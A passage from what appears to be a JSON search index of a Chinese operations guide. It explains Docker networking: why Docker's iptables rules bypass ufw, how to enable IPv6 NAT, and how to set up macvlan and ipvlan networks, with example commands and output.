--ctstate RELATED,ESTABLISHED -j ACCEPT\n-A FORWARD -o br-3e32bdc5bc2a -j DOCKER\n-A FORWARD -i br-3e32bdc5bc2a ! -o br-3e32bdc5bc2a -j ACCEPT\n-A FORWARD -i br-3e32bdc5bc2a -o br-3e32bdc5bc2a -j ACCEPT\n-A FORWARD -j ufw-before-logging-forward\n-A FORWARD -j ufw-before-forward\n-A FORWARD -j ufw-after-forward\n-A FORWARD -j ufw-after-logging-forward\n-A FORWARD -j ufw-reject-forward\n-A FORWARD -j ufw-track-forward\n</code></pre> <p>\u200b\u4e8e\u662f\u200b\u8fd9\u200b\u5c31\u200b\u5bfc\u81f4\u200b\u4e86\u200b\u914d\u7f6e\u200b\u7684\u200b\u300c\u200b\u9632\u706b\u5899\u200b\u300d\u200b\u5bf9\u200b Docker \u200b\u5f62\u540c\u865a\u8bbe\u200b\u7684\u200b\u95ee\u9898\u200b\u3002\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u4ee5\u4e0b\u200b\u51e0\u79cd\u200b\u89e3\u51b3\u65b9\u6848\u200b\uff1a</p> <ul> <li>\u200b\u81ea\u884c\u200b\u7ef4\u62a4\u200b <code>DOCKER-USER</code> \u200b\u94fe\u200b\u3002\u200b\u53ef\u200b\u53c2\u8003\u200b\u5b98\u65b9\u200b\u6587\u6863\u200b\u4e2d\u200b Restrict external connections to containers \u200b\u7684\u200b\u90e8\u5206\u200b\u3002</li> <li>\u200b\u4f7f\u7528\u200b Docker \u200b\u7684\u200b <code>--network host</code> \u200b\u9009\u9879\u200b\uff0c\u200b\u4e0d\u200b\u505a\u200b\u7f51\u7edc\u200b\u9694\u79bb\u200b\uff0c\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b\u4e3b\u673a\u200b\u7684\u200b\u7f51\u7edc\u200b\u3002</li> <li>\u200b\u8bbe\u7f6e\u200b\u7aef\u53e3\u6620\u5c04\u200b\u53ea\u200b\u5411\u200b <code>127.0.0.1</code> \u200b\u5f00\u653e\u200b\uff0c\u200b\u7136\u540e\u200b\u4f7f\u7528\u200b\u5176\u4ed6\u200b\u7684\u200b\u7a0b\u5e8f\u200b\uff08\u200b\u4f8b\u5982\u200b Nginx\uff09\u200b\u6765\u200b\u5bf9\u5916\u200b\u63d0\u4f9b\u200b\u670d\u52a1\u200b\uff08\u200b\u5982\u679c\u200b\u5e0c\u671b\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u9ed8\u8ba4\u200b\u9009\u9879\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b\u6587\u6863\u200b\u4e2d\u200b Setting the default bind address for containers \u200b\u4e00\u8282\u200b\uff09\u3002</li> <li>\u200b\u4e0d\u8ba9\u200b Docker \u200b\u7ef4\u62a4\u200b iptables\u3002\u200b\u8fd9\u4f1a\u200b\u5bfc\u81f4\u200b\u4e00\u4e9b\u200b\u4e0e\u200b\u5bb9\u5668\u200b\u7f51\u7edc\u200b\u6709\u5173\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5bb9\u5668\u200b\u7f51\u7edc\u200b\u4e4b\u95f4\u200b\u7684\u200b\u9694\u79bb\u200b\u5931\u6548\u200b\u3001\u200b\u5bb9\u5668\u200b\u5185\u90e8\u200b\u65e0\u6cd5\u200b\u6b63\u5e38\u200b\u8bbf\u95ee\u200b\u5916\u90e8\u200b\u7f51\u7edc\u200b\u7b49\u7b49\u200b\u3002</li> </ul>"},{"location":"ops/virtualization/container/#ipv6","title":"IPv6","text":"<p>Docker \u200b\u9ed8\u8ba4\u200b\u672a\u200b\u5f00\u542f\u200b IPv6\uff0c\u200b\u5e76\u4e14\u200b\u5728\u200b\u6bd4\u8f83\u200b\u8001\u200b\u7684\u200b\u7248\u672c\u200b\u4e2d\u200b\uff0c\u200b\u914d\u7f6e\u200b IPv6 \u200b\u4f1a\u200b\u6bd4\u8f83\u200b\u9ebb\u70e6\u200b\u3002 \u200b\u4e00\u4e2a\u200b\u91cd\u8981\u200b\u7684\u200b\u539f\u56e0\u200b\u662f\u200b\uff1aDocker \u200b\u5bf9\u200b IPv4 \u200b\u7684\u200b\u7b56\u7565\u200b\u662f\u200b\u914d\u7f6e\u200b NAT \u200b\u7f51\u7edc\u200b\uff0c\u200b\u4f46\u200b\u5728\u200b IPv6 \u200b\u7684\u200b\u8bbe\u8ba1\u200b\u4e2d\u200b\uff0cNAT \u200b\u4e0d\u662f\u200b\u5f88\u200b\u300c\u200b\u539f\u6559\u65e8\u4e3b\u4e49\u200b\u300d\uff08\u200b\u6bd5\u7adf\u200b IPv6 \u200b\u7684\u200b\u5730\u5740\u200b\u591a\u5f97\u200b\u7528\u4e0d\u5b8c\u200b\uff0c\u200b\u4e3a\u4ec0\u4e48\u200b\u8fd8\u8981\u200b\u6709\u200b\u72b6\u6001\u200b\u7684\u200b NAT \u200b\u5462\u200b\uff1f\uff09\u3002\u200b\u8fd9\u200b\u5c31\u200b\u5bfc\u81f4\u200b\u4e86\u200b\u5728\u200b\u4e4b\u524d\u200b\uff0cDocker \u200b\u4e2d\u200b\u914d\u7f6e\u200b\u53ef\u7528\u200b\u7684\u200b IPv6 \u200b\u5c31\u200b\u9700\u8981\u200b\uff1a</p> <ul> <li>\u200b\u8981\u4e48\u200b\u6bcf\u4e2a\u200b\u5bb9\u5668\u200b\u4e00\u4e2a\u200b\u516c\u7f51\u200b IPv6 \u200b\u5730\u5740\u200b\uff08\u200b\u5426\u5219\u200b\u5bb9\u5668\u200b\u65e0\u6cd5\u200b\u8fde\u63a5\u200b\u5916\u90e8\u200b\u7684\u200b IPv6 \u200b\u7f51\u7edc\u200b\uff09\u3002\u200b\u8981\u200b\u8fd9\u4e48\u200b\u505a\u200b\u7684\u200b\u524d\u63d0\u200b\u662f\u200b\u5f97\u200b\u77e5\u9053\u200b\u81ea\u5df1\u200b\u80fd\u200b\u63a7\u5236\u200b\u7684\u200b IPv6 \u200b\u6bb5\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5bb9\u5668\u200b\u6253\u5f00\u200b\u7684\u200b\u6240\u6709\u200b\u7aef\u53e3\u200b\u90fd\u200b\u4f1a\u200b\u66b4\u9732\u200b\u5728\u200b\u516c\u200b\u7f51\u4e0a\u200b\u3002</li> <li>\u200b\u4f7f\u7528\u200b\u7b2c\u4e09\u65b9\u200b\u7684\u200b\u65b9\u6848\u200b\u5e2e\u5fd9\u200b\u505a\u200b IPv6 NAT\uff0c\u200b\u540c\u65f6\u200b\u7ed9\u200b\u5bb9\u5668\u200b\u5206\u914d\u200b IPv6 \u200b\u7684\u200b ULA\uff08Unique Local Address\uff09\u200b\u5730\u5740\u200b\u6bb5\u200b\uff08\u200b\u76ee\u524d\u200b\u53ef\u4ee5\u200b\u5206\u914d\u200b fd00::/8 \u200b\u5185\u200b\u7684\u200b\u5730\u5740\u200b\u6bb5\u200b\uff09\u3002</li> </ul> <p>\u200b\u4e0d\u8fc7\u200b\u597d\u6d88\u606f\u200b\u662f\u200b\uff0c\u200b\u76ee\u524d\u200b Docker \u200b\u6dfb\u52a0\u200b\u4e86\u200b\u5bf9\u200b IPv6 NAT \u200b\u7684\u200b\u5b9e\u9a8c\u6027\u200b\u652f\u6301\u200b\uff0c\u200b\u5c3d\u7ba1\u200b\u9ed8\u8ba4\u200b\u7684\u200b bridge \u200b\u7f51\u7edc\u200b\u7684\u200b IPv6 \u200b\u652f\u6301\u200b\uff08\u200b\u57fa\u4e8e\u200b ip6tables\uff09\u200b\u5728\u200b 27.0 \u200b\u7248\u672c\u200b\u540e\u200b\u624d\u200b\u9ed8\u8ba4\u200b\u6253\u5f00\u200b\u3002\u200b\u5982\u679c\u200b\u6b63\u5728\u200b\u4f7f\u7528\u200b 27.0 \u200b\u4e4b\u524d\u200b\u7684\u200b\u7248\u672c\u200b\uff0c\u200b\u53c2\u8003\u200b\u5bf9\u5e94\u200b\u7684\u200b\u6587\u6863\u200b<sup>1</sup>\uff0c\u200b\u4e00\u4e2a\u200b\u914d\u7f6e\u200b daemon.json \u200b\u7684\u200b\u4f8b\u5b50\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>{\n    \"ipv6\": true,\n    \"fixed-cidr-v6\": \"fd00::/80\",\n    \"experimental\": true,\n    \"ip6tables\": true\n}\n</code></pre> <p>\u200b\u8fd9\u6837\u200b\u65b0\u5efa\u200b\u7684\u200b\u5bb9\u5668\u200b\u5c31\u200b\u80fd\u200b\u5f97\u5230\u200b\u4e00\u4e2a\u200b\u5728\u200b fd00::/80 \u200b\u5185\u200b\u7684\u200b IPv6 \u200b\u5730\u5740\u200b\uff0c\u200b\u5e76\u4e14\u200b\u987a\u5229\u200b\u8bbf\u95ee\u200b\u5916\u90e8\u200b\u7684\u200b IPv6 \u200b\u7f51\u7edc\u200b\u4e86\u200b\uff1a</p> <pre><code>root@14354a8c5349:/# ip a\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n52: eth0@if53: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default \n    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n    inet 172.17.0.3/24 brd 172.17.0.255 scope global eth0\n       valid_lft forever preferred_lft forever\n    inet6 fd00::242:ac11:3/80 scope global nodad \n       valid_lft forever preferred_lft forever\n    inet6 fe80::42:acff:fe11:3/64 scope link \n       valid_lft forever preferred_lft forever\nroot@14354a8c5349:/# ping6 mirrors.ustc.edu.cn\nPING mirrors.ustc.edu.cn(2001:da8:d800:95::110 (2001:da8:d800:95::110)) 56 data bytes\n64 bytes from 2001:da8:d800:95::110 (2001:da8:d800:95::110): icmp_seq=1 ttl=62 time=2.42 ms\n</code></pre>"},{"location":"ops/virtualization/container/#vlan","title":"VLAN","text":"<p>VLAN\uff08\u200b\u865a\u62df\u200b\u5c40\u57df\u7f51\u200b\uff09\u200b\u7528\u4e8e\u200b\u5c06\u200b\u4e00\u4e2a\u200b\u7269\u7406\u200b\u5c40\u57df\u7f51\u200b\u5212\u5206\u200b\u4e3a\u200b\u591a\u4e2a\u200b\u903b\u8f91\u200b\u4e0a\u200b\u7684\u200b\u5c40\u57df\u7f51\u200b\uff0c\u200b\u4ee5\u200b\u5b9e\u73b0\u200b\u7f51\u7edc\u200b\u9694\u79bb\u200b\u3002Docker \u200b\u652f\u6301\u200b <code>macvlan</code> \u200b\u548c\u200b <code>ipvlan</code> \u200b\u4e24\u79cd\u200b VLAN \u200b\u9a71\u52a8\u200b\uff0c\u200b\u524d\u8005\u200b\u5141\u8bb8\u200b\u6bcf\u4e2a\u200b\u5bb9\u5668\u200b\u62e5\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b MAC \u200b\u5730\u5740\u200b\uff0c\u200b\u540e\u8005\u200b\u5219\u200b\u5141\u8bb8\u200b\u6bcf\u4e2a\u200b\u5bb9\u5668\u200b\u62e5\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b\uff08MAC \u200b\u5730\u5740\u200b\u5171\u4eab\u200b\uff09\u3002\u200b\u8fd9\u4e2a\u200b\u529f\u80fd\u200b\u9002\u7528\u200b\u4e8e\u200b\u9700\u8981\u200b\u5c06\u200b\u591a\u4e2a\u200b\u5bb9\u5668\u200b\u76f4\u63a5\u200b\u5728\u200b\u67d0\u4e2a\u200b\u7279\u5b9a\u200b\u7f51\u7edc\u200b\u5185\u200b\u63d0\u4f9b\u200b\u670d\u52a1\u200b\u7684\u200b\u573a\u666f\u200b\u2014\u2014\u200b\u4e00\u79cd\u200b\u573a\u666f\u200b\u662f\u200b\uff0c\u200b\u5185\u200b\u7f51\u200b\u4f7f\u7528\u200b tinc \u200b\u4e92\u8054\u200b\uff0c\u200b\u5e0c\u671b\u200b\u80fd\u591f\u200b\u4f7f\u7528\u200b\u5185\u7f51\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b\u8fde\u63a5\u200b\u5185\u90e8\u200b\u670d\u52a1\u200b\uff0c\u200b\u800c\u200b\u8fd9\u4e9b\u200b\u670d\u52a1\u200b\u53c8\u200b\u5728\u200b Docker \u200b\u5bb9\u5668\u200b\u4e2d\u200b\u3002\u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b Docker \u200b\u7684\u200b VLAN \u200b\u529f\u80fd\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e3a\u200b\u5bb9\u5668\u200b\u5206\u914d\u200b\u4e0d\u540c\u200b\u7684\u200b\u5185\u7f51\u200b IP \u200b\u5730\u5740\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u5185\u200b\u7f51\u200b\u901a\u8fc7\u200b\u5bf9\u5e94\u200b\u7684\u200b IP \u200b\u5373\u53ef\u200b\u76f4\u63a5\u200b\u8bbf\u95ee\u200b\u5230\u200b\u5bb9\u5668\u200b\u670d\u52a1\u200b\u7684\u200b\u9700\u6c42\u200b\u3002</p> <p>Bridge \u200b\u4e0e\u200b macvlan</p> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u66fe\u7ecf\u200b\u6709\u8fc7\u200b\u4f7f\u7528\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b VMware Workstation / VMware Fusion \u200b\u865a\u62df\u673a\u200b\u8f6f\u4ef6\u200b\u7684\u200b\u7ecf\u9a8c\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u53d1\u73b0\u200b\uff1a\u200b\u8f6f\u4ef6\u200b\u4e2d\u200b\u7684\u200b NAT \u200b\u66f4\u200b\u50cf\u662f\u200b Docker \u200b\u91cc\u9762\u200b\u7684\u200b bridge\uff0c\u200b\u800c\u200b\u300c\u200b\u6865\u63a5\u200b\u300d\u200b\u5219\u200b\u66f4\u200b\u50cf\u662f\u200b\u8fd9\u91cc\u200b\u4ecb\u7ecd\u200b\u7684\u200b macvlan\u3002</p> <p>Linux \u200b\u4e0b\u200b\u7684\u200b bridge \u200b\u5b9e\u9645\u4e0a\u200b\u662f\u200b\u4e00\u4e2a\u200b\u865a\u62df\u200b\u7684\u200b\u4ea4\u6362\u673a\u200b\uff1a\u200b\u5728\u200b\u521b\u5efa\u200b bridge \u200b\u4e4b\u540e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4e3a\u200b\u8fd9\u4e2a\u200b bridge \u200b\u6dfb\u52a0\u200b\u5176\u4ed6\u200b\u7684\u200b\u8bbe\u5907\u200b\u4f5c\u4e3a\u200b \"slave\"\uff08\u200b\u8bbe\u7f6e\u200b\u5176\u4ed6\u200b\u8bbe\u5907\u200b\u7684\u200b \"master\" \u200b\u4e3a\u200b\u8fd9\u4e2a\u200b bridge\uff09\uff0c\u200b\u7136\u540e\u200b bridge \u200b\u5c31\u200b\u50cf\u200b\u4ea4\u6362\u673a\u200b\u4e00\u6837\u200b\u8f6c\u53d1\u200b\u6570\u636e\u5305\u200b\u3002\u200b\u540c\u65f6\u200b\uff0cbridge \u200b\u4e5f\u200b\u652f\u6301\u200b\u8bbe\u7f6e\u200b\u4e00\u4e2a\u200b IP \u200b\u5730\u5740\u200b\uff0c\u200b\u76f8\u5f53\u4e8e\u200b\u5728\u200b\u4e3b\u673a\u200b\u4e00\u7aef\u200b\u6709\u200b\u4e00\u4e2a\u200b\u81ea\u5df1\u200b\u7684\u200b \"slave\"\u3002Docker \u200b\u9ed8\u8ba4\u200b\u7684\u200b bridge \u200b\u7f51\u7edc\u200b\u6a21\u5f0f\u200b\u5219\u200b\u662f\u200b\u5229\u7528\u200b\u4e86\u200b\u8fd9\u200b\u4e00\u70b9\u200b\uff1abridge \u200b\u7684\u200b IP \u200b\u4e3a\u200b\u5bb9\u5668\u200b\u7684\u200b\u7f51\u5173\u200b\uff0c\u200b\u4e3b\u673a\u200b\u4e00\u7aef\u200b\u7684\u200b veth \u200b\u8bbe\u5907\u200b\u7684\u200b master \u200b\u662f\u200b Docker \u200b\u521b\u5efa\u200b\u7684\u200b bridge \u200b\u8bbe\u5907\u200b\u3002\u200b\u8fd9\u4e2a\u200b bridge \u200b\u4e0d\u200b\u5bf9\u5e94\u200b\u5230\u200b\u5177\u4f53\u200b\u7684\u200b\u7269\u7406\u200b\u8bbe\u5907\u200b\uff08Docker \u200b\u672a\u200b\u63d0\u4f9b\u200b\u76f8\u5173\u200b\u7684\u200b\u914d\u7f6e\u200b\u65b9\u5f0f\u200b\uff09\u3002</p> <p>\u200b\u800c\u200b\u865a\u62df\u673a\u200b\u8f6f\u4ef6\u200b\u7684\u200b\u6865\u63a5\u200b\u5219\u200b\u9700\u8981\u200b\u6307\u5b9a\u200b\u4e00\u4e2a\u200b\u7269\u7406\u200b\u8bbe\u5907\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u8bbe\u5907\u200b\u4f1a\u200b\u52a0\u5165\u200b\u865a\u62df\u200b\u7684\u200b\u4ea4\u6362\u673a\u200b\u91cc\u9762\u200b\uff0c\u200b\u865a\u62df\u673a\u200b\u4e5f\u200b\u4f1a\u200b\u8fde\u63a5\u200b\u5230\u200b\u8fd9\u4e2a\u200b\u4ea4\u6362\u673a\u200b\u4e0a\u200b\u3002\u200b\u4ece\u200b\u5916\u90e8\u200b\u6765\u770b\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u6a21\u5f0f\u200b\u548c\u200b macvlan \u200b\u7684\u200b\u6548\u679c\u200b\u662f\u200b\u4e00\u6837\u200b\u7684\u200b\uff1a\u200b\u6709\u200b\u591a\u4e2a\u200b\u4e0d\u540c\u200b\u7684\u200b MAC \u200b\u5730\u5740\u200b\u7684\u200b\u8bbe\u5907\u200b\u8fde\u63a5\u200b\u5230\u200b\u540c\u4e00\u4e2a\u200b\u7269\u7406\u200b\u7f51\u7edc\u200b\u4e0a\u200b\uff0c\u200b\u4f46\u662f\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u662f\u200b\u4e0d\u540c\u200b\u7684\u200b\u3002</p> <p>Macvlan \u200b\u4e0e\u200b IPvlan \u200b\u529f\u80fd\u200b\u4e5f\u200b\u652f\u6301\u200b\u5bf9\u63a5\u200b\u57fa\u4e8e\u200b IEEE 802.1Q \u200b\u7684\u200b VLAN \u200b\u914d\u7f6e\u200b\uff0c\u200b\u4f46\u662f\u200b\u8fd9\u91cc\u200b\u4e0d\u200b\u505a\u200b\u8be6\u7ec6\u200b\u4ecb\u7ecd\u200b\u3002</p>"},{"location":"ops/virtualization/container/#macvlan","title":"Macvlan","text":"<p>\u200b\u7531\u4e8e\u200b\u6bcf\u4e2a\u200b\u5bb9\u5668\u200b\u90fd\u200b\u6709\u200b\u4e0d\u540c\u4e8e\u200b\u5bf9\u5e94\u200b\u7f51\u7edc\u8bbe\u5907\u200b\u7684\u200b MAC \u200b\u5730\u5740\u200b\uff0c\u200b\u56e0\u6b64\u200b macvlan \u200b\u6a21\u5f0f\u200b\u8981\u6c42\u200b\u7f51\u7edc\u8bbe\u5907\u200b\u652f\u6301\u200b\u6df7\u6742\u200b\u6a21\u5f0f\u200b\uff08promiscuous mode\uff09\uff0c\u200b\u5373\u200b\u5904\u7406\u200b\u6240\u6709\u200b\u7ecf\u8fc7\u200b\u7684\u200b\u6570\u636e\u5305\u200b\uff0c\u200b\u5373\u4f7f\u200b\u6570\u636e\u5305\u200b\u7684\u200b MAC \u200b\u5730\u5740\u200b\u4e0d\u662f\u200b\u81ea\u5df1\u200b\u7684\u200b\u3002</p> <p>\u200b\u4ee5\u4e0b\u200b\u4ee5\u200b\u4e00\u53f0\u200b Linux \u200b\u865a\u62df\u673a\u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u7684\u200b\u300c\u200b\u7269\u7406\u200b\u300d\u200b\u7f51\u7edc\u8bbe\u5907\u200b\u4e3a\u200b <code>enp1s0</code>\uff1a</p> <pre><code>$ ip a show enp1s0\n2: enp1s0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000\n    link/ether 52:54:00:d3:7d:6f brd ff:ff:ff:ff:ff:ff\n    inet 192.168.122.247/24 brd 192.168.122.255 scope global dynamic noprefixroute enp1s0\n       valid_lft 3577sec preferred_lft 3577sec\n    inet6 fe80::5054:ff:fed3:7d6f/64 scope link noprefixroute \n       valid_lft forever preferred_lft forever\n</code></pre> <p>\u200b\u6211\u4eec\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b macvlan \u200b\u7f51\u7edc\u200b\uff0c\u200b\u5e76\u4e14\u200b\u542f\u52a8\u200b\u591a\u4e2a\u200b\u5bb9\u5668\u200b\uff1a</p> <pre><code>$ sudo docker network create -d macvlan --subnet=192.168.122.0/25 --gateway=192.168.122.1 -o parent=enp1s0 macvlan_test\n047c9f91cb1a6962d45a916f60c612b0174be5425dcf75d55da1b964037d518f\n$ sudo docker run -it --network macvlan_test --name ct1 -d --ip 192.168.122.10 ustclug/debian:12\n83570467e991dea9fe9f221d7e4e6256f37d193a000b23777a4d37429cdd5e47\n$ sudo docker run -it --network macvlan_test --name ct2 -d --ip 192.168.122.11 ustclug/debian:12\nea0ef56a73d940dad0b860099e2d8fe26ddcba1d424824e3f45bf4f492dd54f1\n</code></pre> <p>\u200b\u7531\u4e8e\u200b macvlan \u200b\u7684\u200b\u5b9e\u73b0\u200b\u539f\u56e0\u200b\uff0c\u200b\u8fd9\u200b\u4e24\u4e2a\u200b IP \u200b\u5728\u200b\u4e3b\u673a\u200b\u4e0a\u200b\u65e0\u6cd5\u200b ping \u200b\u901a\u200b\uff0c\u200b\u4f46\u662f\u200b\u5bb9\u5668\u200b\u4e4b\u95f4\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u4e0e\u200b\u865a\u62df\u673a\u200b\u5904\u5728\u200b\u540c\u4e00\u4e2a\u200b\u5b50\u7f51\u200b\u7684\u200b\u5176\u4ed6\u200b\u8bbe\u5907\u200b\u4e4b\u95f4\u200b\u53ef\u4ee5\u200b\u901a\u4fe1\u200b\u3002</p> <pre><code>$ # \u200b\u8be5\u200b\u865a\u62df\u673a\u200b\n$ ping 192.168.122.10\nPING 192.168.122.10 (192.168.122.10) 56(84) bytes of data.\nFrom 192.168.122.247 icmp_seq=1 Destination Host Unreachable\n...\n$ # ct1 \u200b\u5185\u90e8\u200b\u2014\u2014\u200b\u9700\u8981\u200b\u5148\u200b\u5b89\u88c5\u200b iputils-ping\n$ sudo docker exec -it ct1 ping 192.168.122.11\nPING 192.168.122.11 (192.168.122.11) 56(84) bytes of data.\n64 bytes from 192.168.122.11: icmp_seq=1 ttl=64 time=0.095 ms\n...\n$ # \u200b\u540c\u200b\u5b50\u7f51\u200b\u5176\u4ed6\u200b\u8bbe\u5907\u200b\uff08\u200b\u4f8b\u5982\u200b\u5bbf\u4e3b\u673a\u200b\uff09\n$ ping 192.168.122.10\nPING 192.168.122.10 (192.168.122.10) 56(84) bytes of data.\n64 bytes from 192.168.122.10: icmp_seq=1 ttl=64 time=0.284 ms\n...\n</code></pre> <p>\u200b\u540c\u65f6\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u9a8c\u8bc1\u200b\u5b83\u4eec\u200b\u7684\u200b MAC \u200b\u5730\u5740\u200b\u4e0d\u540c\u200b\uff1a</p> <pre><code>$ sudo arping 192.168.122.10\nARPING 192.168.122.10 from 192.168.122.1 virbr0\nUnicast reply from 192.168.122.10 [02:42:C0:A8:7A:0A]  1.091ms\n...\n$ sudo arping 192.168.122.11\nARPING 192.168.122.11 from 192.168.122.1 virbr0\nUnicast reply from 192.168.122.11 [02:42:C0:A8:7A:0B]  0.979ms\n...\n</code></pre> <p>\u200b\u89e3\u51b3\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\u7684\u200b\u4e00\u79cd\u200b\u65b9\u6cd5\u200b\u662f\u200b\u5728\u200b\u4e3b\u673a\u200b\u4e0a\u200b\u6dfb\u52a0\u200b\u4e00\u4e2a\u200b\uff08\u200b\u548c\u200b\u5bb9\u5668\u200b\u7684\u200b macvlan \u200b\u4e00\u6837\u200b\u7684\u200b\uff09\u200b\u65b0\u200b\u7684\u200b macvlan \u200b\u63a5\u53e3\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4e92\u76f8\u200b\u901a\u4fe1\u200b\u4e86\u200b\uff1a</p> <pre><code>$ sudo ip link add macvlan-enp1s0 link enp1s0 type macvlan mode bridge\n$ sudo ip addr add 192.168.122.9/25 dev macvlan-enp1s0\n$ sudo ip link set macvlan-enp1s0 up\n$ ping 192.168.122.10\nPING 192.168.122.10 (192.168.122.10) 56(84) bytes of data.\n64 bytes from 192.168.122.10: icmp_seq=1 ttl=64 time=0.172 ms\n</code></pre>"},{"location":"ops/virtualization/container/#ipvlan","title":"IPvlan","text":"<p>\u200b\u8fd9\u91cc\u200b\u4e3b\u8981\u200b\u5173\u6ce8\u200b IPvlan \u200b\u7684\u200b L2 \u200b\u6a21\u5f0f\u200b\uff08\u200b\u4e5f\u200b\u662f\u200b IPvlan \u200b\u7684\u200b\u9ed8\u8ba4\u200b\u6a21\u5f0f\u200b\uff09\uff0cL3 \u200b\u6a21\u5f0f\u200b\u4e0e\u200b\u4e0a\u6587\u200b\u7684\u200b\u573a\u666f\u200b\u4e0d\u540c\u200b\uff0c\u200b\u66f4\u52a0\u200b\u5173\u6ce8\u200b\u7f51\u7edc\u200b\u7684\u200b\u9694\u79bb\u200b\uff0c\u200b\u548c\u200b bridge \u200b\u7f51\u7edc\u200b\u7c7b\u4f3c\u200b\uff08\u200b\u4e3b\u673a\u200b\u5916\u90e8\u200b\u7f51\u7edc\u200b\u65e0\u6cd5\u8bbf\u95ee\u200b\u5230\u200b\u5176\u4e2d\u200b\u7684\u200b\u5bb9\u5668\u200b\uff09\u3002 \u200b\u540c\u65f6\u200b\u7531\u4e8e\u200b\u4e0d\u200b\u9700\u8981\u200b\u989d\u5916\u200b\u7684\u200b MAC \u200b\u5730\u5740\u200b\uff0cIPvlan \u200b\u53ef\u4ee5\u200b\u907f\u514d\u200b\u6df7\u6742\u200b\u6a21\u5f0f\u200b\u7684\u200b\u5f00\u542f\u200b\u3002</p> <p>\u200b\u548c\u200b macvlan \u200b\u975e\u5e38\u200b\u76f8\u4f3c\u200b\uff0c\u200b\u4ecd\u7136\u200b\u662f\u200b\u521b\u5efa\u200b\u7f51\u7edc\u200b\u4e0e\u200b\u5bb9\u5668\u200b\uff1a</p> <pre><code>$ # \u200b\u5728\u200b\u6267\u884c\u547d\u4ee4\u200b\u4e4b\u524d\u200b\uff0c\u200b\u9700\u8981\u200b\u5148\u200b\u6e05\u9664\u200b\u4e0a\u6587\u200b\u7684\u200b macvlan \u200b\u7f51\u7edc\u200b\uff0c\u200b\u5426\u5219\u200b\u7f51\u6bb5\u200b\u4f1a\u200b\u51b2\u7a81\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u521b\u5efa\u200b\n$ # \u200b\u6e05\u7406\u200b\u4e4b\u540e\u200b\u5c31\u200b\u53ef\u4ee5\u200b\uff1a\n$ sudo docker network create -d ipvlan --subnet=192.168.122.0/25 --gateway=192.168.122.1 -o parent=enp1s0 ipvlan_test\n1d7118ac1a4520b08d4420260700550bb1bcf2ff2badf6f2aeae830b7119502c\n$ # \u200b\u4e0b\u9762\u200b\u7684\u200b\u5185\u5bb9\u200b\u548c\u200b macvlan \u200b\u662f\u200b\u51e0\u4e4e\u200b\u4e00\u81f4\u200b\u7684\u200b\uff0c\u200b\u7701\u7565\u200b\n</code></pre> <p>\u200b\u4e3b\u673a\u200b\u65e0\u6cd5\u200b\u8fde\u901a\u200b\u5bb9\u5668\u200b IP \u200b\u7684\u200b\u95ee\u9898\u200b\u4ecd\u7136\u200b\u5b58\u5728\u200b\uff0c\u200b\u89e3\u51b3\u200b\u65b9\u6cd5\u200b\u4e5f\u200b\u51e0\u4e4e\u200b\u4e00\u81f4\u200b\uff1a</p> <pre><code>$ sudo ip link add ipvlan-enp1s0 link enp1s0 type ipvlan mode l2\n$ # \u200b\u540e\u9762\u200b\u7701\u7565\u200b\u2026\u2026\n$ ping 192.168.122.10\nPING 192.168.122.10 (192.168.122.10) 56(84) bytes of data.\n64 bytes from 192.168.122.10: icmp_seq=1 ttl=64 time=0.154 ms\n</code></pre> <p>\u200b\u540c\u65f6\u200b\uff0c\u200b\u5bb9\u5668\u200b\u4e0e\u200b\u4e3b\u673a\u200b\u5171\u4eab\u200b\u76f8\u540c\u200b\u7684\u200b MAC \u200b\u5730\u5740\u200b\uff1a</p> <pre><code>$ sudo arping 192.168.122.10\nARPING 192.168.122.10 from 192.168.122.1 virbr0\nUnicast reply from 192.168.122.10 [52:54:00:D3:7D:6F]  0.687ms\n...\n$ sudo arping 192.168.122.11\nARPING 192.168.122.11 from 192.168.122.1 virbr0\nUnicast reply from 192.168.122.11 [52:54:00:D3:7D:6F]  0.721ms\n...\n$ sudo arping 192.168.122.247  # \u200b\u865a\u62df\u673a\u200b\u4e3b\u673a\u200b\nARPING 192.168.122.247 from 192.168.122.1 virbr0\nUnicast reply from 192.168.122.247 [52:54:00:D3:7D:6F]  0.852ms\n...\n</code></pre>"},{"location":"ops/virtualization/container/#docker-compose","title":"Docker Compose","text":"<p>Docker compose \u200b\u662f\u200b Docker 